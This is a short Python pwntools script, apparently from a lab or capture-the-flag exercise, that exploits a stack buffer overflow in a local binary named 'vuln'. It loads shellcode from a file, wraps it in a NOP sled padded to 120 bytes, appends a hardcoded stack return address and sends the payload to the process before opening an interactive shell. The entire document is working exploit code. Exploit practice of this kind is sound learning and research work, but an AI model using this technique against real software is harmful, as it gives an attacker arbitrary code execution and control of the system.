#!/bin/python3

from pwn import p64, process

STACK = 0x7fffffffecf0

def main():

    ## load shellcode
    with open("shell64", "rb") as sc:
        shelly = sc.read()

    ## create payload
    nops = b"\x90" * (120-len(shelly))
    payload = nops[:30]
    payload += shelly                 # put shellcode in the middle
    payload += nops[30:]
    payload += p64(STACK)

    ## save payload for debuging
    with open("pattern", "wb") as t:
        t.write(payload)

    ## start process
    target = process("./vuln")

    ## exploit 
    target.sendline(payload)
    target.clean()
    target.interactive()


if __name__ == "__main__":
    main()

